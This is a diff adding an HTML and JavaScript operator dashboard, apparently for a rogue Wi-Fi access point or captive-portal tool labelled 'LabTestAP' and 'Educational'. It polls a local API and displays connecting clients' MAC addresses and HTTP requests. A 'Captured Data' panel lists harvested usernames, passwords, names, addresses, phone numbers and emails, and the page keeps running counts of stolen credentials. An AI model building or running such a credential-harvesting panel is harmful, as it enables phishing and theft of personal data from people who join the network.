@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Luminescence Dashboard</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Menlo,monospace;background:#0a0a0a;color:#d8d8d8;padding:14px;font-size:14px;line-height:1.45}
+header{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;background:#121212;border:1px solid #262626;border-radius:10px;margin-bottom:14px}
+h1{font-size:16px;font-weight:600;color:#e8e8e8;letter-spacing:.3px}
+h1 .sub{color:#666;font-weight:400;margin-left:8px;font-size:13px}
+.live{display:flex;align-items:center;gap:8px;color:#6fcf6f;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:1px}
+.dot{width:8px;height:8px;border-radius:50%;background:#6fcf6f;box-shadow:0 0 8px #6fcf6f;animation:pulse 1.5s ease-in-out infinite}
+.live.off{color:#cf6f6f}
+.live.off .dot{background:#cf6f6f;box-shadow:0 0 8px #cf6f6f;animation:none}
+.live.paused{color:#888}
+.live.paused .dot{background:#888;box-shadow:none;animation:none}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:10px;margin-bottom:14px}
+.stat{background:#121212;border:1px solid #262626;border-radius:10px;padding:12px 14px}
+.stat .lbl{font-size:11px;color:#666;text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
+.stat .val{font-size:22px;font-weight:600;color:#e8e8e8}
+.stat .sub-val{font-size:11px;color:#555;margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.stat.creds .val{color:#ff6b6b}
+.stat.bio .val{color:#ffb347}
+.stat.clients .val{color:#6fcf6f}
+.stat.bridge-up .val{color:#6fcf6f}
+.stat.bridge-down .val{color:#ff6b6b}
+.grid{display:grid;grid-template-columns:1fr 400px;gap:14px;height:calc(100vh - 290px);min-height:400px}
+@media (max-width:820px){.grid{grid-template-columns:1fr;height:auto}}
+.panel{background:#121212;border:1px solid #262626;border-radius:10px;display:flex;flex-direction:column;overflow:hidden}
+.panel h2{font-size:12px;text-transform:uppercase;letter-spacing:1.5px;color:#888;padding:12px 14px;border-bottom:1px solid #262626;font-weight:600;display:flex;justify-content:space-between}
+.panel h2 .count{color:#4a9eff;font-weight:500}
+.feed{flex:1;overflow-y:auto;padding:8px}
+.feed::-webkit-scrollbar{width:6px}
+.feed::-webkit-scrollbar-track{background:#0a0a0a}
+.feed::-webkit-scrollbar-thumb{background:#2a2a2a;border-radius:3px}
+.row{padding:8px 10px;border-radius:6px;margin-bottom:4px;display:flex;gap:10px;align-items:flex-start;font-size:13px;border-left:3px solid transparent;background:#151515;animation:slidein .3s ease}
+@keyframes slidein{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:none}}
+.row .ts{color:#555;font-size:11px;flex-shrink:0;font-variant-numeric:tabular-nums;min-width:56px}
+.row .tag{font-size:10px;font-weight:600;text-transform:uppercase;padding:2px 6px;border-radius:3px;flex-shrink:0;letter-spacing:.5px}
+.row .body{flex:1;min-width:0;word-break:break-all;color:#c0c0c0}
+.row .body b{color:#e8e8e8;font-weight:500}
+.row .body .dim{color:#666;font-size:12px}
+.row.connect{border-left-color:#6fcf6f}
+.row.connect .tag{background:#1a2e1a;color:#6fcf6f}
+.row.disconnect{border-left-color:#666}
+.row.disconnect .tag{background:#2a2a2a;color:#888}
+.row.get{border-left-color:#4a9eff}
+.row.get .tag{background:#1a2a40;color:#4a9eff}
+.row.post{border-left-color:#a78bfa}
+.row.post .tag{background:#241a40;color:#a78bfa}
+.row.portal{border-left-color:#ffb347}
+.row.portal .tag{background:#2e2415;color:#ffb347}
+.row.credential{border-left-color:#ff6b6b;background:#1f1414}
+.row.credential .tag{background:#3a1a1a;color:#ff6b6b}
+.row.biodata{border-left-color:#ffb347;background:#1f1a14}
+.row.biodata .tag{background:#3a2a15;color:#ffb347}
+.row.bridge_up{border-left-color:#6fcf6f;background:#151f15}
+.row.bridge_up .tag{background:#1a2e1a;color:#6fcf6f}
+.row.bridge_down{border-left-color:#ff6b6b;background:#1f1515}
+.row.bridge_down .tag{background:#3a1a1a;color:#ff6b6b}
+.empty{color:#555;text-align:center;padding:40px 20px;font-size:13px}
+.card{padding:10px 12px;border-radius:6px;margin:0 8px 6px;background:#151515;border-left:3px solid #ff6b6b;animation:slidein .3s ease}
+.card.bio{border-left-color:#ffb347}
+.card .k{color:#777;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
+.card .v{color:#e8e8e8;font-weight:500;margin-bottom:4px;font-size:13px}
+.card .meta{color:#555;font-size:11px;margin-top:4px}
+footer{margin-top:14px;text-align:center;color:#444;font-size:11px}
+.pill{display:inline-block;background:#1a1a1a;padding:1px 6px;border-radius:3px;color:#888;font-size:11px;margin-right:4px}
+</style>
+</head>
+<body>
+<header>
+  <h1>Luminescence Dashboard <span class="sub">Phase 5 — Bridge Mode</span></h1>
+  <div class="live" id="liveBadge"><span class="dot"></span><span id="liveTxt">Live</span></div>
+</header>
+
+<div class="stats">
+  <div class="stat"><div class="lbl">Uptime</div><div class="val" id="sUptime">—</div></div>
+  <div class="stat" id="sBridgeStat"><div class="lbl">Bridge</div><div class="val" id="sBridge">—</div><div class="sub-val" id="sBridgeIP"></div></div>
+  <div class="stat clients"><div class="lbl">Clients</div><div class="val" id="sClients">0</div></div>
+  <div class="stat"><div class="lbl">Requests</div><div class="val" id="sReq">0</div></div>
+  <div class="stat"><div class="lbl">GET / POST</div><div class="val" id="sGP">0/0</div></div>
+  <div class="stat creds"><div class="lbl">Credentials</div><div class="val" id="sCreds">0</div></div>
+  <div class="stat bio"><div class="lbl">Biodata</div><div class="val" id="sBio">0</div></div>
+</div>
+
+<div class="grid">
+  <div class="panel">
+    <h2>Event Feed <span class="count" id="feedCount">0</span></h2>
+    <div class="feed" id="feed"><div class="empty">Waiting for events…</div></div>
+  </div>
+  <div class="panel">
+    <h2>Captured Data <span class="count" id="capCount">0</span></h2>
+    <div class="feed" id="captured"><div class="empty">No credentials yet</div></div>
+  </div>
+</div>
+
+<footer>LabTestAP · <span class="pill">GPL-3.0</span><span class="pill">Educational</span>Adaptive poll</footer>
+
+<script>
+(function(){
+  var sinceId   = 0;
+  var failures  = 0;
+  var timer     = null;
+  var MIN_DELAY = 1000;
+  var MAX_DELAY = 30000;
+  var delay     = MIN_DELAY;
+  var MAX_ROWS  = 100;
+
+  var feedEl = document.getElementById('feed');
+  var capEl  = document.getElementById('captured');
+  var feedCount = 0, capCount = 0;
+
+  function pad(n){return n<10?'0'+n:''+n}
+  function fmtTs(ms){
+    var s = Math.floor(ms/1000);
+    return pad(Math.floor(s/3600)%24)+':'+pad(Math.floor(s/60)%60)+':'+pad(s%60);
+  }
+  function esc(s){
+    return String(s==null?'':s).replace(/[&<>"]/g,function(c){
+      return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c];
+    });
+  }
+
+  function setLive(state){
+    var b = document.getElementById('liveBadge');
+    var t = document.getElementById('liveTxt');
+    b.classList.remove('off','paused');
+    if (state === 'live')        { t.textContent = 'Live'; }
+    else if (state === 'paused') { b.classList.add('paused'); t.textContent = 'Paused'; }
+    else                         { b.classList.add('off');    t.textContent = 'Offline'; }
+  }
+
+  function renderEvent(ev){
+    var d = ev.detail || {};
+    var row = document.createElement('div');
+    var cssType = ev.type.replace(/_/g, '_');  // keep underscores for bridge_up/bridge_down
+    row.className = 'row ' + ev.type;
+    var tag = ev.type.toUpperCase().replace(/_/g, ' ');
+    var body = '';
+    var ipMeta = ev.ip ? ' <span class="dim">'+esc(ev.ip)+'</span>' : '';
+
+    if (ev.type === 'connect' || ev.type === 'disconnect'){
+      body = '<b>'+(ev.type==='connect'?'Client joined':'Client left')+'</b> '
+           + '<span class="dim">'+esc(d.mac||'?')+'</span>';
+    } else if (ev.type === 'get' || ev.type === 'post' || ev.type === 'portal'){
+      body = '<b>'+esc(d.method||'')+'</b> '+esc(d.path||'')+ipMeta;
+      if (d.device) body += '<br><span class="dim">'+esc(d.device)+'</span>';
+    } else if (ev.type === 'credential'){
+      body = '<b>Credentials</b> '+esc(d.username||'')+' : '+esc(d.password||'')+ipMeta;
+      renderCaptured(ev, 'creds');
+    } else if (ev.type === 'biodata'){
+      body = '<b>Biodata</b> '+esc(d.nama||'')+ipMeta;
+      renderCaptured(ev, 'bio');
+    } else if (ev.type === 'bridge_up'){
+      body = '<b>Bridge UP</b> upstream: <b>'+esc(d.upstream||'?')+'</b>'
+           + ' · STA IP: '+esc(d.ip||'?');
+    } else if (ev.type === 'bridge_down'){
+      body = '<b>Bridge DOWN</b> <span class="dim">'+esc(d.reason||'')+'</span>';
+    } else {
+      body = '<b>'+tag+'</b> '+esc(JSON.stringify(d));
+    }
+
+    row.innerHTML = '<span class="ts">'+fmtTs(ev.ts)+'</span>'
+                  + '<span class="tag">'+tag+'</span>'
+                  + '<span class="body">'+body+'</span>';
+
+    if (feedCount === 0) feedEl.innerHTML = '';
+    feedEl.insertBefore(row, feedEl.firstChild);
+    feedCount++;
+    while (feedEl.children.length > MAX_ROWS) feedEl.removeChild(feedEl.lastChild);
+    document.getElementById('feedCount').textContent = feedCount;
+  }
+
+  function renderCaptured(ev, kind){
+    var d = ev.detail || {};
+    var card = document.createElement('div');
+    card.className = 'card' + (kind==='bio' ? ' bio' : '');
+    var inner = '';
+    if (kind === 'creds'){
+      inner += '<div class="k">Username</div><div class="v">'+esc(d.username||'—')+'</div>';
+      inner += '<div class="k">Password</div><div class="v">'+esc(d.password||'—')+'</div>';
+    } else {
+      if (d.nama)    inner += '<div class="k">Nama</div><div class="v">'+esc(d.nama)+'</div>';
+      if (d.alamat)  inner += '<div class="k">Alamat</div><div class="v">'+esc(d.alamat)+'</div>';
+      if (d.telepon) inner += '<div class="k">Telepon</div><div class="v">'+esc(d.telepon)+'</div>';
+      if (d.email && d.email !== '(empty)')
+                     inner += '<div class="k">Email</div><div class="v">'+esc(d.email)+'</div>';
+    }
+    inner += '<div class="meta">'+fmtTs(ev.ts)+' · '+esc(ev.ip||'—')+'</div>';
+    card.innerHTML = inner;
+
+    if (capCount === 0) capEl.innerHTML = '';
+    capEl.insertBefore(card, capEl.firstChild);
+    capCount++;
+    while (capEl.children.length > MAX_ROWS) capEl.removeChild(capEl.lastChild);
+    document.getElementById('capCount').textContent = capCount;
+  }
+
+  function applyStats(s){
+    if (!s) return;
+    document.getElementById('sUptime').textContent  = s.uptime || '—';
+    document.getElementById('sClients').textContent = s.clients;
+    document.getElementById('sReq').textContent     = s.requests;
+    document.getElementById('sGP').textContent      = s.get + '/' + s.post;
+    document.getElementById('sCreds').textContent   = s.creds;
+    document.getElementById('sBio').textContent     = s.biodata;
+
+    // Bridge status (Phase 5)
+    var bEl  = document.getElementById('sBridge');
+    var bIP  = document.getElementById('sBridgeIP');
+    var bStat = document.getElementById('sBridgeStat');
+    bStat.classList.remove('bridge-up','bridge-down');
+    if (s.bridge === true || s.bridge === 'true') {
+      bEl.textContent = 'UP';
+      bStat.classList.add('bridge-up');
+      bIP.textContent = s.sta_ip || '';
+    } else {
+      bEl.textContent = 'DOWN';
+      bStat.classList.add('bridge-down');
+      bIP.textContent = s.sta_ssid ? 'ssid: ' + s.sta_ssid : '';
+    }
+  }
+
+  function schedule(){
+    if (timer) clearTimeout(timer);
+    if (document.hidden) return;
+    timer = setTimeout(tick, delay);
+  }
+
+  function onOk(data){
+    failures = 0;
+    delay = MIN_DELAY;
+    setLive('live');
+    applyStats(data.stats);
+    (data.events || []).forEach(function(ev){
+      renderEvent(ev);
+      if (ev.id > sinceId) sinceId = ev.id;
+    });
+    schedule();
+  }
+
+  function onFail(){
+    failures++;
+    if (failures >= 2) setLive('off');
+    delay = Math.min(delay * 2, MAX_DELAY);
+    schedule();
+  }
+
+  function tick(){
+    fetch('/api/poll?since='+sinceId, {cache:'no-store'})
+      .then(function(r){ if(!r.ok) throw 0; return r.json(); })
+      .then(onOk)
+      .catch(onFail);
+  }
+
+  document.addEventListener('visibilitychange', function(){
+    if (document.hidden){
+      if (timer){ clearTimeout(timer); timer = null; }
+      setLive('paused');
+    } else {
+      delay = MIN_DELAY;
+      tick();
+    }
+  });
+
+  tick();
+})();
+</script>
+</body>
+</html>
